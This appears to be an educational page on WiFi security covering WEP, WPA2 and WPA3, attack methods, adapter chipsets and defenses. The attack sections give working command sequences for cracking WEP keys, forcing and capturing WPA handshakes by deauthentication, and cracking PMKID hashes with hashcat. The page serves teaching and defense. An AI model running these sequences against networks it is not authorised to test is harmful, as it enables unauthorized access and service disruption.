Wireless Security

Wireless Network Security

Wireless networks present unique security challenges due to their broadcast nature. Understanding WiFi security protocols, vulnerabilities, and attack methods is crucial for both offensive and defensive security.

Learning Objective: Master wireless security concepts, learn to identify vulnerabilities, and understand both attack and defense techniques for WiFi networks.

Why Wireless Security Matters

Security Challenges
  • Radio waves can be intercepted
  • Physical access not required
  • Difficult to control signal boundaries
  • Vulnerable to eavesdropping
  • Susceptible to jamming attacks
Common Vulnerabilities
  • Weak encryption protocols
  • Default credentials
  • WPS vulnerabilities
  • Rogue access points
  • Client-side attacks

WiFi Encryption Protocols

WEP (Wired Equivalent Privacy)

WEP - Deprecated and Insecure
  • Key Length: 64-bit or 128-bit
  • Algorithm: RC4 stream cipher
  • Vulnerabilities: IV reuse, weak key scheduling
  • Attack Time: Can be cracked in minutes
# WEP cracking with aircrack-ng aircrack-ng -b [BSSID] capture.cap

WPA/WPA2 (WiFi Protected Access)

WPA (TKIP)
  • Temporal Key Integrity Protocol
  • Dynamic key generation
  • Message Integrity Check
  • Vulnerable to certain attacks
WPA2 (AES-CCMP)
  • Advanced Encryption Standard
  • Counter Mode with CBC-MAC
  • Strong encryption (when properly configured)
  • Vulnerable to KRACK attack

WPA3 (Latest Standard)

WPA3 Improvements
  • SAE: Simultaneous Authentication of Equals
  • Forward Secrecy: Past sessions remain secure
  • Brute Force Protection: Rate limiting
  • Enhanced Open: Opportunistic Wireless Encryption
  • 192-bit Security: For enterprise networks
  • Easy Connect: Simplified device onboarding
  • Management Frame Protection: Required
  • Individualized Data Encryption: Per-device keys

Common Wireless Attacks

1. Passive Attacks

Eavesdropping and Monitoring
# Monitor mode setup airmon-ng start wlan0 # Capture wireless traffic airodump-ng wlan0mon # Capture specific network airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

2. WEP Attacks

# WEP cracking process # 1. Capture packets airodump-ng -c 6 --bssid [TARGET_BSSID] -w wep_capture wlan0mon # 2. Generate traffic (if needed) aireplay-ng -3 -b [TARGET_BSSID] -h [CLIENT_MAC] wlan0mon # 3. Crack WEP key aircrack-ng wep_capture-01.cap

3. WPA/WPA2 Attacks

4-Way Handshake Capture
# Capture handshake airodump-ng -c 6 --bssid [BSSID] -w handshake wlan0mon # Deauth to force handshake aireplay-ng -0 5 -a [BSSID] -c [CLIENT] wlan0mon # Crack with wordlist aircrack-ng -w wordlist.txt handshake-01.cap
PMKID Attack
# Capture PMKID hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 # Convert for hashcat hcxpcapngtool -o pmkid.hash -k pmkid.txt pmkid.pcapng # Crack with hashcat hashcat -m 16800 pmkid.hash wordlist.txt

Hardware Requirements

Compatible WiFi Adapters

Not all WiFi adapters support monitor mode and packet injection. Recommended chipsets:

  • Atheros: AR9271, AR9170
  • Ralink: RT3070, RT3572, RT5370
  • Realtek: RTL8187, RTL8812AU
  • Popular Models: Alfa AWUS036ACS, TP-Link AC600

Wireless Security Defense

Best Practices

Access Point Configuration
  • Use WPA3 (or WPA2 if unavailable)
  • Strong, unique passwords (12+ characters)
  • Disable WPS
  • Change default admin credentials
  • Enable MAC address filtering (if practical)
  • Disable SSID broadcast (security through obscurity)
Network Architecture
  • Guest network isolation
  • VLAN segmentation
  • Regular firmware updates
  • Monitor for rogue access points
  • Implement 802.1X authentication
  • Use VPN for sensitive communications

Enterprise Security

# WPA2-Enterprise with RADIUS # hostapd.conf configuration interface=wlan0 driver=nl80211 ssid=Corporate_WiFi hw_mode=g channel=6 wpa=2 wpa_key_mgmt=WPA-EAP wpa_pairwise=TKIP CCMP rsn_pairwise=CCMP auth_server_addr=192.168.1.10 auth_server_port=1812 auth_server_shared_secret=radius_secret

Monitoring and Detection

# Wireless intrusion detection # Monitor for rogue APs airodump-ng wlan0mon --output-format csv -w scan # Detect deauth attacks python3 deauth_detector.py # Monitor signal strength anomalies iwlist wlan0 scan | grep -E "ESSID|Signal level" # Log wireless events tail -f /var/log/hostapd.log

Client-Side Security

Client Device Protection
  • Disable auto-connect to open networks
  • Forget old networks that are no longer used
  • Use VPN on public WiFi
  • Keep devices updated with latest security patches
  • Monitor connections for suspicious activity
  • Use HTTPS for all web communications
